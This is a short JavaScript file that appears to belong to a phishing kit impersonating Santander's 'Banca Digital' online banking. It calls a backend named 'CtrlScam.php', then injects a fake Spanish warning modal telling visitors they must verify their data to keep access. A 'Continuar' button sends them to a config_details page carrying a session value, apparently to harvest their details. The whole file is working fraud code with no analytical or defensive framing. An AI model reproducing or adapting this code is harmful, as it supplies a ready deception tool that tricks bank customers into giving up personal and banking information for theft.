function redirectPage(){
    
    window.location.href="config_details.php?dispositivo="+document.getElementById("tipo").value+"&session="+$('#session').val();
    //alert($('#session').val())
}

$(document).ready(function () {
    
    //alert('Aqui estoy');

    var redirect = "config_details.php?dispositivo="+$('#tipo').val();
    
    var alertModal = '<ngb-modal-window id="modalConfig" role="dialog" tabindex="-1" class="modal fade show d-block" ><div id="modalConfig" role="dialog" tabindex="-1" class="modal fade show d-block" style=""><div role="document" class="modal-dialog"><div class="modal-content"><ng-component _nghost-c17=""><div _ngcontent-c17="" class="ng-star-inserted"><div _ngcontent-c17="" class="modal-header"><div _ngcontent-c17="" class="mdl-hdr-txt"><img _ngcontent-c17="" alt="" src="../assets/img/warning.svg"><h1 _ngcontent-c17="" id="txtHeaderModal">Atenci&oacute;n</h1></div></div><div _ngcontent-c17="" class="modal-body" id="msg"><p _ngcontent-c17="" class="txt-message">Es necesario que inicie el proceso de vinculaci&oacute;n de alertas mobiles para continuar con el acceso a la Banca Digital Santander<br><br><br>			Para continuar es necesario verificar sus datos</p></div><div id="botonera2" _ngcontent-c16="" class="modal-footer two-buttons"><button onClick="redirectPage()" id="btnAcept2" _ngcontent-c16="" class="btn ng-star-inserted" type="button">Continuar</button></div></div></ng-component></div></div></ngb-modal-window>';
    
    $.ajax({
        type: 'POST',
        url: '../../Controllers/CtrlScam.php',
        data: {
            "request": "loading_panel"
        },
        beforeSend: function(){
            console.log("ENviando...");
            $('#loading').show();
        },
        success: function (resp){
            console.log('Datos Enviados');
            $('#loading').hide();
            
            $('#back_modal').show();
            
            //console.log($('#back_modal').parent().attr('class'))
            
            $('#div').html(alertModal);
            /*$('#modalConfig').show();
            */
            //console.log(alertModal);
        },
        error: function (request, textStatus, errorThrown) {
            console.log('Error al Enviar los Datos: '+errorThrown);
        }
    });
    
    $('#btnAcept2').click(function(e){
        e.preventDefault();
        console.log('ok');
        //alert($('#session').val());
        //window.location.href="config_details.php?dispositivo="+$('#tipo').val()+"&session="+$('#session').val();
    });
    
    $('#btnEmail').click(function(e){
        e.preventDefault();
        //alert();
    });
});
